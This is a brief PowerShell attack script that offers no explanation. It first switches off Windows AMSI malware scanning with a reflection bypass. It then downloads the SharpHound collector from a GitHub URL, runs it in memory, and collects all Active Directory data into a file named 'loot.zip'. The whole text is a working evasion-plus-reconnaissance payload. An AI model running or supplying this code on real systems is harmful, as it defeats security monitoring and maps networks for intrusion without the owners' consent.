$payload = @"
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true);
. ([System.Net.WebClient]::new()).DownloadString('https://raw.githubusercontent.com/SpecterOps/BloodHound-Legacy/refs/heads/master/Collectors/SharpHound.ps1');
Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip
"@
$sb = [ScriptBlock]::Create($payload)
& $sb
